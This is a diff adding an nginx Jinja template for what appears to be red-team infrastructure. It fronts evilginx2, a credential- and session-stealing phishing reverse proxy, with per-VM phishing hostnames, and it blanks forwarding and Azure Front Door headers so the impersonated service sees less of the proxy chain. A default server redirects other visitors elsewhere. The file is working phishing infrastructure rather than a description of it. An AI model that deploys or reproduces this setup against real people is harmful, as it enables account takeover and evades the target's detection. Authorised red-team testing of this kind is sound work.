@@ -1,0 +1,93 @@
+events {
+
+}
+
+http {
+  error_log /etc/nginx/log/error.log warn;
+  access_log /etc/nginx/log/access.log;
+  client_max_body_size 20m;
+
+  resolver 127.0.0.11 valid=10s;
+  
+  proxy_cache_path /etc/nginx/cache keys_zone=one:500m max_size=1000m;
+
+  set_real_ip_from  10.0.0.0/8;
+  set_real_ip_from  172.16.0.0/12;
+  set_real_ip_from  192.168.0.0/16;
+  real_ip_header    X-Real-IP;
+
+  geo $allow_azure { 
+    147.243.0.0/16 0;
+    47.196.170.234/32 0;
+    default 1;
+  }
+
+  server {
+    server_name {% raw %}{{ ansible_host }}{% endraw %};
+    listen 443 ssl;
+    ssl_certificate /etc/letsencrypt/live/{% raw %}{{ domain_name }}{% endraw %}/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/{% raw %}{{ domain_name }}{% endraw %}/privkey.pem;
+    ssl_session_timeout 1440m;
+    ssl_session_cache shared:le_nginx_SSL:1m;
+    ssl_session_tickets off;
+    ssl_protocols TLSv1.2;
+    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256';
+    ssl_prefer_server_ciphers on;
+    add_header Strict-Transport-Security max-age=15768000;
+    ssl_stapling on;
+    ssl_stapling_verify on;
+
+    location / {
+      rewrite ^ https://{% raw %}{{ redirect_domain }}{% endraw %};
+    }
+  
+  }
+{% for vm in warhorse.vm %}
+{% if vm.evilginx2 is defined and vm.evilginx2.enabled %}
+  server {
+    server_name {% for host in vm.evilginx2.nginx_hostnames %}{{ host }}.{{ vm.evilginx2.evilginx_domain }} {% endfor %};
+    listen 443 ssl;
+    ssl_certificate /etc/letsencrypt/live/{{ domain_name }}/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/{{ domain_name }}/privkey.pem;
+    ssl_session_timeout 1440m;
+    ssl_session_cache shared:le_nginx_SSL:1m;
+    ssl_session_tickets off;
+    ssl_protocols TLSv1.2;
+    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256';
+    ssl_prefer_server_ciphers on;
+    add_header Strict-Transport-Security max-age=15768000;
+    ssl_stapling on;
+    ssl_stapling_verify on;
+
+    proxy_busy_buffers_size   512k;
+    proxy_buffers   4 512k;
+    proxy_buffer_size   256k;
+    fastcgi_buffers  16 16k;
+    fastcgi_buffer_size  32k;
+
+    location / {
+      resolver 127.0.0.11 valid=10s;
+      proxy_ssl_server_name on;
+      proxy_ssl_name $host;
+      proxy_set_header Host $host;
+      proxy_set_header X-Real-IP "";
+      proxy_set_header X-Forwarded-For "";
+      proxy_set_header X-Forwarded-Proto "";
+      proxy_set_header X-Forwarded-Host "";
+      proxy_set_header X-Azure-Socketip "";
+      proxy_set_header X-Azure-Requestchain "";
+      proxy_set_header X-Azure-Ref "";
+      proxy_set_header X-Azure-Ipdetection "";
+      proxy_set_header X-Azure-Fdid "";
+      proxy_set_header X-Azure-Clientip "";
+      proxy_set_header Via "";
+      proxy_set_header X-Msedge-Ignoreratelimits "";
+      proxy_ssl_protocols  TLSv1 TLSv1.1 TLSv1.2; 
+      proxy_ssl_verify off;
+      proxy_pass https://evilginx2:443;
+    }
+{% endif %}
+{% endfor %}
+  }
+
+}
